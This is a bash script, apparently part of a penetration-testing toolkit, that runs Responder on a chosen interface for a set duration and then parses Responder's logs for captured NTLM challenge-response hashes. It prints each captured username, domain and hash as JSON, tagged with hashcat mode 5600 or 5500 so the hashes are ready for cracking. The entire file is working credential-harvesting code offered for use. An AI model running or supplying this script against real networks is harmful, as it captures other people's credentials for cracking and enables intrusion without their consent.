#!/bin/bash
# Responder hash capture script
# Usage: responder_capture.sh [interface] [duration_seconds]
# required_tools: responder
set -euo pipefail

IFACE="${1:-eth0}"
DURATION="${2:-60}"

echo "{\"type\":\"status\",\"data\":{\"action\":\"responder_capture\",\"interface\":\"$IFACE\",\"duration\":$DURATION}}"

LOG_DIR="/usr/share/responder/logs"
[ -d "$LOG_DIR" ] || LOG_DIR="$(pwd)/logs"
mkdir -p "$LOG_DIR" 2>/dev/null || true

echo "{\"type\":\"status\",\"data\":{\"message\":\"Starting Responder in analyze mode for ${DURATION}s on $IFACE\",\"log_dir\":\"$LOG_DIR\"}}"

responder -I "$IFACE" -A &
RESPONDER_PID=$!

sleep "$DURATION"
kill "$RESPONDER_PID" 2>/dev/null || true
wait "$RESPONDER_PID" 2>/dev/null || true

echo "{\"type\":\"status\",\"data\":{\"message\":\"Responder stopped, parsing captured hashes\"}}"

for hashfile in "$LOG_DIR"/*.txt; do
  [ -f "$hashfile" ] || continue
  FILENAME=$(basename "$hashfile")

  while IFS= read -r line; do
    [ -z "$line" ] && continue
    if echo "$line" | grep -q ":::"; then
      PROTO=$(echo "$FILENAME" | sed -n 's/^\([A-Z]*\)-.*/\1/p')
      USERNAME=$(echo "$line" | cut -d: -f1)
      DOMAIN=$(echo "$line" | cut -d: -f2 | tr -d '[:space:]')
      CHALLENGE=$(echo "$line" | cut -d: -f3)
      RESPONSE=$(echo "$line" | cut -d: -f4)

      HASH_MODE="5600"
      if echo "$RESPONSE" | grep -qE '^[0-9a-f]{96}$'; then
        HASH_MODE="5600"
      elif echo "$RESPONSE" | grep -qE '^[0-9a-f]{48}$'; then
        HASH_MODE="5500"
      fi

      echo "{\"type\":\"hash\",\"data\":{\"protocol\":\"$PROTO\",\"domain\":\"$DOMAIN\",\"username\":\"$USERNAME\",\"hash_mode\":$HASH_MODE,\"hash\":\"$line\",\"file\":\"$FILENAME\"}}"
    fi
  done < "$hashfile"
done

echo "{\"type\":\"result\",\"data\":{\"action\":\"responder_capture\",\"status\":\"complete\",\"duration\":$DURATION}}"
